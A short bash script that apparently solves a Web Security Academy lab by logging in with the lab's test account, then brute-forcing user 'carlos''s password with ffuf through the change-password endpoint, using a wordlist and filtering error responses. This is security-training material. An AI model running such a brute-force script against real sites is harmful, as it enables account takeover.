#!/bin/bash

command -v ffuf &> /dev/null || { printf "\x1b[31mRequires ffuf to be installed.\x1b[0m\n"; exit 1; }

USAGE="Usage: $0 lab-id"

validUser="wiener"
validPass="peter"
targetUser="carlos"
passwordList="../../../../res/passwords.txt"

labId="$1"
[[ "$labId" ]] || { echo "$USAGE"; exit 1; }

labHost="$labId.web-security-academy.net"
labUrl="https://$labHost"

# Get a valid session ID
printf "    Lab ID :: \x1b[32m%s\x1b[0m\n" "$labId"
printf "Session ID :: "
response=$(curl "$labUrl/login" -d "username=$validUser&password=$validPass" -v 2>&1)
if echo "$response" | grep -P "^< HTTP/1.1 302 Found\r$" &>/dev/null; then
    session=$(echo "$response" | grep -oP "(?<=session=)\w+")
fi
[[ "$session" ]] || { printf "\x1b[31m%s\x1b[0m\n" "Failed to obtain a valid session ID."; exit 1; }
printf "\x1b[32m%s\x1b[0m\n" "$session"

# Enumerate passwords with ffuf
ffuf \
    -u "$labUrl/my-account/change-password" \
    -b "session=$session" \
    -w "$passwordList:PASSWD" \
    -d "username=$targetUser&current-password=PASSWD&new-password-1=x&new-password-2=y" \
    -fr "password is incorrect"